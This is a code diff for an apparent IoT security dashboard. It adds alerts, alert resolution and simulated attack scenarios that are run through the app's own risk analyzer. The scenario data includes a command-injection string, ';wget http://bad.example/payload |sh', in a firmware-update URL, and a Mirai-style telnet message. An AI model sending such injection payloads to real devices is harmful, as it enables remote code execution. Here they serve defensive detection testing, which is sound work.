@@ -1,6 +1,6 @@
 import { ensureSchema, sql } from "@/lib/db";
 import { createId, createToken, hashToken, safeCompareHash, slugify } from "@/lib/security";
-import type { RiskResult } from "@/lib/risk";
+import { analyzePayload, type IngestPayload, type RiskResult } from "@/lib/risk";
 
 type DbDate = string | Date | null;
 
@@ -60,7 +60,10 @@ export type SecurityEvent = {
   severity: string;
   score: number;
   verdict: string;
+  category: string;
+  confidence: number;
   summary: string;
+  recommended_action: string;
   signals: string[];
   packet: Record<string, unknown>;
   raw: Record<string, unknown>;
@@ -80,12 +83,29 @@ export type BlockedIp = {
   project_name?: string;
 };
 
+export type SecurityAlert = {
+  id: string;
+  project_id: string;
+  event_id: string | null;
+  severity: string;
+  title: string;
+  description: string;
+  action: string;
+  resolved: boolean;
+  created_at: DbDate;
+  resolved_at: DbDate;
+  project_name?: string;
+  source_ip?: string | null;
+  score?: number | null;
+};
+
 export type DashboardStats = {
   project_count: number;
   device_count: number;
   event_count: number;
   malicious_count: number;
   blocked_count: number;
+  alert_count: number;
   avg_score: number;
 };
 
@@ -95,6 +115,7 @@ export type DashboardData = {
   devices: DeviceSummary[];
   events: SecurityEvent[];
   blockedIps: BlockedIp[];
+  alerts: SecurityAlert[];
 };
 
 type DeviceCredentialRow = Device & {
@@ -267,6 +288,7 @@ export async function getDashboard(userId: string): Promise<DashboardData> {
       (SELECT COUNT(*)::int FROM events WHERE project_id IN (SELECT project_id FROM user_projects)) AS event_count,
       (SELECT COUNT(*)::int FROM events WHERE project_id IN (SELECT project_id FROM user_projects) AND verdict = 'malicious') AS malicious_count,
       (SELECT COUNT(*)::int FROM blocked_ips WHERE project_id IN (SELECT project_id FROM user_projects) AND active = true) AS blocked_count,
+      (SELECT COUNT(*)::int FROM alerts WHERE project_id IN (SELECT project_id FROM user_projects) AND resolved = false) AS alert_count,
       (SELECT COALESCE(ROUND(AVG(score))::int, 0) FROM events WHERE project_id IN (SELECT project_id FROM user_projects)) AS avg_score
   `;
 
@@ -329,6 +351,22 @@ export async function getDashboard(userId: string): Promise<DashboardData> {
     LIMIT 50
   `;
 
+  const alerts = await sql<SecurityAlert>`
+    SELECT
+      a.*,
+      p.name AS project_name,
+      e.source_ip,
+      e.score
+    FROM alerts a
+    INNER JOIN projects p ON p.id = a.project_id
+    INNER JOIN project_members pm ON pm.project_id = p.id
+    LEFT JOIN events e ON e.id = a.event_id
+    WHERE pm.user_id = ${userId}
+      AND a.resolved = false
+    ORDER BY a.created_at DESC
+    LIMIT 25
+  `;
+
   return {
     stats: stats ?? {
       project_count: 0,
@@ -336,12 +374,14 @@ export async function getDashboard(userId: string): Promise<DashboardData> {
       event_count: 0,
       malicious_count: 0,
       blocked_count: 0,
+      alert_count: 0,
       avg_score: 0,
     },
     projects,
     devices,
     events,
     blockedIps,
+    alerts,
   };
 }
 
@@ -439,7 +479,10 @@ export async function recordSecurityEvent(input: {
       severity,
       score,
       verdict,
+      category,
+      confidence,
       summary,
+      recommended_action,
       signals,
       packet,
       raw
@@ -453,7 +496,10 @@ export async function recordSecurityEvent(input: {
       ${input.severity},
       ${input.analysis.score},
       ${input.analysis.verdict},
+      ${input.analysis.category},
+      ${input.analysis.confidence},
       ${input.analysis.summary},
+      ${input.analysis.recommendedAction},
       ${JSON.stringify(input.analysis.signals)}::jsonb,
       ${JSON.stringify(input.packet ?? {})}::jsonb,
       ${JSON.stringify(input.raw ?? {})}::jsonb
@@ -462,6 +508,51 @@ export async function recordSecurityEvent(input: {
   `;
 
   return event;
+}
+
+export async function createDetectionAlert(input: {
+  projectId: string;
+  eventId: string;
+  sourceIp: string;
+  analysis: RiskResult;
+  blocked: boolean;
+}) {
+  await ensureSchema();
+
+  if (input.analysis.verdict === "clean" && !input.blocked) {
+    return null;
+  }
+
+  const id = createId("alt");
+  const severity =
+    input.blocked || input.analysis.verdict === "malicious" ? "critical" : "warning";
+  const title = input.blocked
+    ? `Blocked malicious source ${input.sourceIp}`
+    : `${input.analysis.category.replaceAll("_", " ")} detected`;
+
+  const [alert] = await sql<SecurityAlert>`
+    INSERT INTO alerts (
+      id,
+      project_id,
+      event_id,
+      severity,
+      title,
+      description,
+      action
+    )
+    VALUES (
+      ${id},
+      ${input.projectId},
+      ${input.eventId},
+      ${severity},
+      ${title},
+      ${input.analysis.summary},
+      ${input.analysis.recommendedAction}
+    )
+    RETURNING *
+  `;
+
+  return alert;
 }
 
 export async function upsertBlockedIp(input: {
@@ -527,4 +618,185 @@ export async function disableBlock(userId: string, blockId: string) {
   `;
 
   return updated;
+}
+
+export async function resolveAlert(userId: string, alertId: string) {
+  await ensureSchema();
+  const [alert] = await sql<SecurityAlert>`
+    SELECT a.*
+    FROM alerts a
+    INNER JOIN project_members pm ON pm.project_id = a.project_id
+    WHERE a.id = ${alertId}
+      AND pm.user_id = ${userId}
+      AND pm.role <> 'viewer'
+    LIMIT 1
+  `;
+
+  if (!alert) {
+    return null;
+  }
+
+  const [updated] = await sql<SecurityAlert>`
+    UPDATE alerts
+    SET resolved = true, resolved_at = now()
+    WHERE id = ${alertId}
+    RETURNING *
+  `;
+
+  return updated;
+}
+
+const attackScenarios: Record<
+  string,
+  {
+    label: string;
+    sourceIp: string;
+    payload: IngestPayload;
+  }
+> = {
+  mirai_telnet: {
+    label: "Mirai-style telnet brute force",
+    sourceIp: "198.51.100.23",
+    payload: {
+      eventType: "attack-simulation",
+      severity: "critical",
+      message:
+        "Mirai botnet pattern: failed password attempts over telnet using root:root and wget /bin/sh payload",
+      packet: { protocol: "tcp", destPort: 23, bytes: 4096 },
+      telemetry: { authFailures: 140, connectionAttempts: 160 },
+    },
+  },
+  port_scan: {
+    label: "Reconnaissance port scan",
+    sourceIp: "203.0.113.45",
+    payload: {
+      eventType: "attack-simulation",
+      severity: "high",
+      message: "nmap syn scan against SSH, Telnet, HTTP, MQTT, and camera ports",
+      packet: { protocol: "tcp", destPort: 22, bytes: 1536, flags: ["SYN"] },
+      telemetry: { connectionAttempts: 220, uniquePorts: 28 },
+    },
+  },
+  mqtt_flood: {
+    label: "MQTT flood and replay",
+    sourceIp: "203.0.113.91",
+    payload: {
+      eventType: "attack-simulation",
+      severity: "critical",
+      message: "mqtt flood with replay attack against command topic",
+      packet: { protocol: "mqtt", destPort: 1883, bytes: 65000 },
+      telemetry: { connectionAttempts: 480 },
+    },
+  },
+  command_injection: {
+    label: "Firmware command injection",
+    sourceIp: "198.51.100.88",
+    payload: {
+      eventType: "attack-simulation",
+      severity: "critical",
+      message: "HTTP request attempted ;wget http://bad.example/payload |sh",
+      packet: {
+        protocol: "http",
+        destPort: 80,
+        bytes: 3072,
+        path: "/firmware/update?url=;wget%20http://bad.example/payload%20|sh",
+      },
+      telemetry: { authFailures: 12 },
+    },
+  },
+  data_exfiltration: {
+    label: "Suspicious outbound data transfer",
+    sourceIp: "203.0.113.120",
+    payload: {
+      eventType: "attack-simulation",
+      severity: "high",
+      message: "unexpected bulk upload from sensor subnet to unknown host",
+      packet: { protocol: "tcp", destPort: 443, bytes: 875000 },
+      telemetry: { outboundBytes: 1250000 },
+    },
+  },
+};
+
+export function listAttackScenarios() {
+  return Object.entries(attackScenarios).map(([id, scenario]) => ({
+    id,
+    label: scenario.label,
+  }));
+}
+
+export async function runAttackSimulation(
+  userId: string,
+  input: { projectId: string; deviceId: string; scenario: string },
+) {
+  await ensureSchema();
+
+  const scenario = attackScenarios[input.scenario];
+  if (!scenario) {
+    return null;
+  }
+
+  const [device] = await sql<DeviceCredentialRow>`
+    SELECT d.*, p.name AS project_name, p.risk_threshold, p.auto_block
+    FROM devices d
+    INNER JOIN projects p ON p.id = d.project_id
+    INNER JOIN project_members pm ON pm.project_id = p.id
+    WHERE pm.user_id = ${userId}
+      AND pm.role <> 'viewer'
+      AND d.project_id = ${input.projectId}
+      AND d.id = ${input.deviceId}
+    LIMIT 1
+  `;
+
+  if (!device) {
+    return null;
+  }
+
+  const sourceIp = scenario.sourceIp;
+  const activeBlock = await findActiveBlock(input.projectId, sourceIp);
+  const recentIpEvents = await getRecentIpEventCount(input.projectId, sourceIp);
+  const analysis = analyzePayload({
+    ...scenario.payload,
+    sourceIp,
+    recentIpEvents,
+    alreadyBlocked: Boolean(activeBlock),
+  });
+
+  const event = await recordSecurityEvent({
+    projectId: input.projectId,
+    deviceId: input.deviceId,
+    sourceIp,
+    eventType: scenario.payload.eventType ?? "attack-simulation",
+    severity: scenario.payload.severity ?? "critical",
+    analysis,
+    packet: scenario.payload.packet ?? {},
+    raw: {
+      simulation: true,
+      scenario: input.scenario,
+      label: scenario.label,
+      ...scenario.payload,
+    },
+  });
+
+  await updateDeviceSeen(input.deviceId, sourceIp);
+
+  let blocked = Boolean(activeBlock);
+  if (!activeBlock && device.auto_block && analysis.score >= Number(device.risk_threshold)) {
+    await upsertBlockedIp({
+      projectId: input.projectId,
+      ip: sourceIp,
+      reason: `Attack simulation: ${analysis.summary}`,
+      score: analysis.score,
+    });
+    blocked = true;
+  }
+
+  const alert = await createDetectionAlert({
+    projectId: input.projectId,
+    eventId: event.id,
+    sourceIp,
+    analysis,
+    blocked,
+  });
+
+  return { event, alert, blocked, scenario: scenario.label };
 }
